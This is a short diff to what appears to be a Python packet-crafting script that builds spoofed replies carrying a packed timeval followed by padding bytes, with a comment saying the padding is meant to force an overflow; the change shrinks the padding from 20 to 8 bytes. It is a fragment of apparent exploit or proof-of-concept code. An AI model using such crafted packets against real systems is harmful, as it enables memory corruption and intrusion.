@@ -106,7 +106,7 @@ def process_packet(pkt):
     usec = int((fut - sec) * 1_000_000)
 
     data = struct.pack('=ll', sec, usec)
-    data += b'Z'*20   # padding to force full timeval read and overflow
+    data += b'Z'*8   # padding to force full timeval read and overflow
 
     reply = (
         IP(src=ip.dst, dst=ip.src) /
